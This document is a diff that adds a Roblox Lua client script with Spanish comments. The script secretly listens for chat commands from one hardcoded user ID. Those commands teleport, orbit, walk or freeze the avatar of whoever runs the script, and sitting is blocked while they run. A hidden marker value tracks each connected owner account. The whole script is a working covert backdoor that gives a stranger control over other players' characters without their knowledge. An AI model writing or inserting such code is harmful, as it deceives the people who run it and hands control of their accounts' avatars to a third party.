@@ -1,0 +1,173 @@
+task.spawn(function()
+    repeat task.wait() until game:IsLoaded()
+
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LocalPlayer = Players.LocalPlayer
+    local ownerId = 4591285210
+
+    local Orbiting = false
+    local Walking = false
+    local Frozen = false
+
+    -- Obtener jugador objetivo (por nombre o default al owner)
+    local function GetTargetPlayer(name)
+        if name then
+            name = name:lower()
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower():sub(1, #name) == name then
+                    return player
+                end
+            end
+        end
+        return Players:GetPlayerByUserId(ownerId)
+    end
+
+    -- Evitar sentarse
+    local function StartAntiSeatLoop()
+        task.spawn(function()
+            while Orbiting or Walking do
+                task.wait(0.2)
+                local char = LocalPlayer.Character
+                if char then
+                    local hum = char:FindFirstChildWhichIsA("Humanoid")
+                    local hrp = char:FindFirstChild("HumanoidRootPart")
+                    if hum and hum.Sit then hum.Sit = false end
+                    if hrp and hrp.SeatPart then hrp.SeatPart:Sit(nil) end
+                end
+            end
+        end)
+    end
+
+    -- Teleport
+    local function TeleportToPlayer(name)
+        local target = GetTargetPlayer(name)
+        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+            local pos = target.Character.HumanoidRootPart.Position
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0, 6, 0))
+            end
+        end
+    end
+
+    -- Orbit
+    local function StopOrbit()
+        Orbiting = false
+        RunService:UnbindFromRenderStep("OrbitAroundTarget")
+    end
+
+    local function StartOrbit(name)
+        if LocalPlayer.UserId == ownerId then return end
+        StopOrbit()
+        Orbiting = true
+        StartAntiSeatLoop()
+
+        local target = GetTargetPlayer(name)
+        if not target then Orbiting = false return end
+
+        RunService:BindToRenderStep("OrbitAroundTarget", Enum.RenderPriority.Character.Value, function()
+            if not Orbiting then return end
+            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and
+               LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local t = tick()
+                local radius = 10
+                local speed = 2
+                local x = math.cos(t * speed) * radius
+                local z = math.sin(t * speed) * radius
+                local targetPos = target.Character.HumanoidRootPart.Position
+                local newPos = targetPos + Vector3.new(x, 3, z)
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(newPos, targetPos)
+            end
+        end)
+    end
+
+    -- Walk
+    local function StopWalking()
+        Walking = false
+        RunService:UnbindFromRenderStep("WalkToTarget")
+    end
+
+    local function WalkToPlayer(name)
+        if LocalPlayer.UserId == ownerId then return end
+        StopWalking()
+        Walking = true
+        StartAntiSeatLoop()
+
+        local target = GetTargetPlayer(name)
+        if not target then Walking = false return end
+
+        RunService:BindToRenderStep("WalkToTarget", Enum.RenderPriority.Character.Value, function()
+            if not Walking then return end
+            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and
+               LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+                humanoid:MoveTo(target.Character.HumanoidRootPart.Position)
+            end
+        end)
+    end
+
+    -- Freeze
+    local function FreezeAll()
+        Frozen = true
+        RunService:BindToRenderStep("FreezePlayers", Enum.RenderPriority.Camera.Value, function()
+            if not Frozen then return end
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.Anchored = true
+            end
+        end)
+    end
+
+    local function UnfreezeAll()
+        Frozen = false
+        RunService:UnbindFromRenderStep("FreezePlayers")
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            char.HumanoidRootPart.Anchored = false
+        end
+    end
+
+    -- Comandos
+    local function OwnerChatHandler(message)
+        local msg = message:lower()
+        local args = {}
+        for word in msg:gmatch("%S+") do table.insert(args, word) end
+
+        if args[1] == ".t" then
+            TeleportToPlayer(args[2])
+        elseif args[1] == ".u" then
+            StartOrbit(args[2])
+        elseif args[1] == ".uu" then
+            StopOrbit()
+        elseif args[1] == ".w" then
+            WalkToPlayer(args[2])
+        elseif args[1] == ".ww" then
+            StopWalking()
+        elseif args[1] == ".q" then
+            FreezeAll()
+        elseif args[1] == ".qq" then
+            UnfreezeAll()
+        end
+    end
+
+    -- Conexión
+    local function CheckAndConnectPlayers()
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.UserId == ownerId and not player:FindFirstChild("__JmodsConnected") then
+                local marker = Instance.new("BoolValue")
+                marker.Name = "__JmodsConnected"
+                marker.Parent = player
+                player.Chatted:Connect(OwnerChatHandler)
+            end
+        end
+    end
+
+    Players.PlayerAdded:Connect(function(player)
+        task.wait(0.5)
+        if player.UserId == ownerId then
+            CheckAndConnectPlayers()
+        end
+    end)
+
+    CheckAndConnectPlayers()
+end)
